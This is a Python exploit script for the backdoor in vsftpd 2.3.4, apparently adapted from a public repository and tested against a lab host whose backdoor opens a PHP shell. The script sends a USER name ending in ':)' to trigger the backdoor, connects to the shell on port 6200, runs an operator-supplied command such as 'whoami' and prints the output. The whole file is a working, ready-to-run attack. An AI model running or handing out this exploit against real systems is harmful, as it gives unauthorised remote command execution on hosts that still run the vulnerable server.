#!/usr/bin/python3
import socket
import sys
import time

#this exploit is a slight modification of https://github.com/In2econd/vsftpd-2.3.4-exploit to be able to interact with a different 
#kind of shell
#*********************************************************************************************************************
#this code was tested on vsftpd 2.3.4 which upon connection launch a Psy Shell v0.9.9 (PHP 7.2.10 â€” cli) by Justin Hileman**
#*********************************************************************************************************************
#*********how it works********************************************
#during the connection we can trigger a backdoor which was implemented in vsftpd v2.3.4 by send sending the appending :) to ther USER string
# ftp> USER whateeveruwantw:)
# ftp> PASS doesnotmatter
#
def exploit(ip, port, command):
    """ Triggers vsftpd 2.3.4 backdoor and prints supplied command's output """

    try:
        swap = ""
        if len(command) > 1:
            for i in command:
                swap = swap+i+" "
        else:
            swap = command[0]
        command = swap
        print(command)
        print('[*] Attempting to trigger backdoor...')
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((ip, port))

        # Attempt to login to trigger backdoor
        ftp_socket.send(b'USER xoxo:)\n')
        ftp_socket.send(b'PASS xoxo\n')
        time.sleep(2)
        ftp_socket.close()
        print('[+] Triggered backdoor')

    except Exception:
        print('[!] Failed to trigger backdoor on %s' % ip)

    try:
        print('[*] Attempting to connect to backdoor...')
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_socket.connect((ip, 6200))
        print('[+] Connected to backdoor on %s:6200' % ip)

        response = backdoor_socket.recv(1024).decode('utf-8')  #modify the buffer size(1024) at will 
        print('[+] Response1:\n', response, sep='')
        time.sleep(5)  #wait for the shell to be loaded
        command = str.encode(command + '\n')  #send the command
        print('[+] command encoded: ', command)
        backdoor_socket.send(command)
        time.sleep(5)  #wait to process the result u can 
        response = backdoor_socket.recv(1024).decode('utf-8')
        print('[+] Response:\n', response, sep='')
        backdoor_socket.close()

    except Exception:
        print('[!] Failed to connect to backdoor on %s:6200' % ip)


if __name__ == '__main__':

    if len(sys.argv) < 4:
        print('Usage: ./vsftpd_234_exploit.py <IP address> <port> <command>')
        print('Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami')

    else:

        exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3:len(sys.argv)])
